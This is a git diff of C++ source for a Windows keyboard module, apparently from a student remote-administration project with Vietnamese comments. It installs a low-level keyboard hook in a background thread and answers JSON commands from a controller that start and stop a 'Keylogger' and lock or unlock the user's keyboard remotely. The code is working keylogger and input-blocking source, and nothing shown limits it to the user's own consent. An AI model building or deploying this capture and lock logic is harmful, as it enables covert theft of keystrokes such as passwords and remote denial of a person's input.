@@ -97,62 +97,79 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     // Chuyển tiếp cho ứng dụng khác nếu không chặn
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
 }
-// --- CÁC HÀM CỦA CLASS ---
+
+/// ============================================================
+// IMPLEMENT CLASS KEYMANAGER
+// ============================================================
+
+const std::string& KeyManager::get_module_name() const {
+    static const std::string name = "KEYBOARD";
+    return name;
+}
 
 void KeyManager::set_callback(KeyCallback cb) {
     g_callback = cb;
 }
 
-// [MỚI] Hàm set trạng thái từ Command
 void KeyManager::set_locked(bool locked) {
     g_isLocked = locked;
     std::cout << "[KEYBOARD] Lock state: " << (locked ? "LOCKED" : "UNLOCKED") << std::endl;
 }
 
 void KeyManager::start_hook() {
-    if (g_hHook != NULL) return;
+    if (g_hHook != NULL) return; // Đã chạy rồi thì thôi
+
+    // Hook cần vòng lặp message (Message Loop) riêng, nên phải chạy trong thread mới
     hookThread = std::thread([]() {
         g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+        
         MSG msg;
+        // Vòng lặp giữ thread sống để lắng nghe sự kiện
         while (GetMessage(&msg, NULL, 0, 0)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
-        UnhookWindowsHookEx(g_hHook);
-        g_hHook = NULL;
+        
+        // Khi vòng lặp kết thúc (thường khó xảy ra trừ khi PostQuitMessage), dọn dẹp
+        if (g_hHook) {
+            UnhookWindowsHookEx(g_hHook);
+            g_hHook = NULL;
+        }
     });
-    hookThread.detach();
+    hookThread.detach(); // Tách thread để nó chạy ngầm
+    std::cout << "[KEYBOARD] Hook started.\n";
 }
 
 void KeyManager::stop_hook() {
     if (g_hHook) {
-        // Gửi message WM_QUIT tới thread hook nếu cần thiết, 
-        // hoặc đơn giản là Unhook (tuy nhiên Unhook từ thread khác có thể ko an toàn tuyệt đối nhưng dùng tạm cho đồ án ok)
         UnhookWindowsHookEx(g_hHook);
         g_hHook = NULL;
-        g_isLocked = false; // Reset trạng thái khi stop
+        g_isLocked = false;
+        std::cout << "[KEYBOARD] Hook stopped.\n";
     }
+    // Lưu ý: Thread cũ vẫn có thể đang treo ở GetMessage, 
+    // nhưng Unhook sẽ làm nó ngừng nhận phím. 
+    // Trong thực tế production cần gửi WM_QUIT tới thread ID để đóng thread sạch sẽ.
 }
 
 json KeyManager::handle_command(const json& request) {
     std::string command = request.value("command", "");
-    
+
     if (command == "START") {
         start_hook();
         return {{"status", "success"}, {"message", "Keylogger started"}};
     }
-    if (command == "STOP") {
+    else if (command == "STOP") {
         stop_hook();
         return {{"status", "success"}, {"message", "Keylogger stopped"}};
     }
-    // [MỚI] LỆNH LOCK / UNLOCK
-    if (command == "LOCK") {
-        // Phải đảm bảo Hook đã chạy thì mới Lock được
-        if (g_hHook == NULL) start_hook(); 
+    else if (command == "LOCK") {
+        // Nếu chưa hook thì phải hook mới lock được
+        if (g_hHook == NULL) start_hook();
         set_locked(true);
-        return {{"status", "success"}, {"message", "Keyboard LOCKED. Press Ctrl+Alt+U to unlock locally."}};
+        return {{"status", "success"}, {"message", "Keyboard LOCKED (Ctrl+Alt+U to unlock)"}};
     }
-    if (command == "UNLOCK") {
+    else if (command == "UNLOCK") {
         set_locked(false);
         return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
     }
